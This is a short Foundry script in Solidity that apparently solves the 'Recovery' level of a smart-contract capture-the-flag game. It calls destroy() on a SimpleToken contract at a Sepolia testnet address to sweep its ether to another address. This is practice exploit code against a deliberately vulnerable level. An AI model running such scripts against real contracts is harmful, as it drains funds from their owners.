// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../levels/17-Recovery.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    SimpleToken simpleToken = SimpleToken(payable(0x51b779B4Bf6e7EA11b556e2FAFB94bd2C27D7bA3)); // https://sepolia.etherscan.io/tx/0xbfa55b0a571697380cfcbad34cf72bc7ab57e86bdc2c466477926aa56324da17#internal

    function run() external{
        vm.startBroadcast();
        
        simpleToken.destroy(payable(0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048));

        require(address(simpleToken).balance == 0);

        vm.stopBroadcast();
    }
}